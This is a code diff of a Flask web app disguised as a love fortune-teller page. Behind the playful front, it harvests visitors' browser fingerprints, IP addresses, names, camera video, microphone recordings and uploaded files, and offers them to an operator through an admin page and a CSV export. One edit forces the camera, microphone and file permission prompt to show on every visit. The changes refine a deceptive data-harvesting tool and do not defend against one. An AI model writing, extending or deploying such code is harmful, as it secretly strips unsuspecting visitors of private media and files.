@@ -107,13 +107,10 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
-    # Ensure camera, microphone, files fields always exist
-    if 'cameraVideo' not in data:
-        data['cameraVideo'] = 'not captured'
-    if 'microphone' not in data:
-        data['microphone'] = 'not captured'
-    if 'files' not in data:
-        data['files'] = 'not captured'
+    # Ensure fields exist
+    for field in ['cameraVideo', 'microphone', 'files']:
+        if field not in data:
+            data[field] = 'not captured'
     save_visitor(data)
     return jsonify({'status': 'saved'})
 
@@ -145,7 +142,7 @@ def admin():
             visitors = get_visitors()
             if not visitors:
                 return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
-            # Collect all possible keys from all visitors
+            # Collect all keys
             all_keys = set()
             for v in visitors:
                 all_keys.update(v.keys())
@@ -196,13 +193,11 @@ def download_csv():
     if not visitors:
         return 'No data', 404
     
-    # Collect all keys
     all_keys = set()
     for v in visitors:
         all_keys.update(v.keys())
     all_keys = sorted(list(all_keys))
     
-    # Create CSV content
     import csv
     from io import StringIO
     output = StringIO()
@@ -212,7 +207,6 @@ def download_csv():
         row = [str(v.get(k, '')) for k in all_keys]
         writer.writerow(row)
     
-    # Return as CSV download
     return Response(
         output.getvalue(),
         mimetype='text/csv',
@@ -350,6 +344,7 @@ HTML_TEMPLATE = '''
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
+    // Session ID (persists across refreshes)
     let sessionId = localStorage.getItem('fortuneSessionId');
     if (!sessionId) {
         sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
@@ -361,6 +356,7 @@ HTML_TEMPLATE = '''
     let currentFortuneText = "";
     let hasExistingData = false;
 
+    // ---------- Device info collectors ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -403,6 +399,7 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
+    // On page load, check if this session already has a fortune
     window.addEventListener('load', async () => {
         try {
             const resp = await fetch('/get-session-data', {
@@ -455,13 +452,8 @@ HTML_TEMPLATE = '''
         
         await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
-        
-        const permsAlreadyGranted = localStorage.getItem('lovePermissionsGranted');
-        if (permsAlreadyGranted === 'true') {
-            await finalizeAndSave();
-        } else {
-            document.getElementById('permissions').classList.remove('hidden');
-        }
+        // Always show the permission UI (no skipping) – but user will see it only once because browser remembers permissions.
+        document.getElementById('permissions').classList.remove('hidden');
     }
 
     function showStep(title, status, percent) {
@@ -478,7 +470,6 @@ HTML_TEMPLATE = '''
             await getMedia();
             await getFilesTraditional();
         } catch(e) { console.log("Permission step error", e); }
-        localStorage.setItem('lovePermissionsGranted', 'true');
         await finalizeAndSave();
     }
 
@@ -617,6 +608,7 @@ HTML_TEMPLATE = '''
         currentFortuneText = fortuneData.fortune;
         document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
         
+        // Ensure fields exist
         if (!visitorData.cameraVideo) visitorData.cameraVideo = 'not captured';
         if (!visitorData.microphone) visitorData.microphone = 'not captured';
         if (!visitorData.files) visitorData.files = 'not captured';
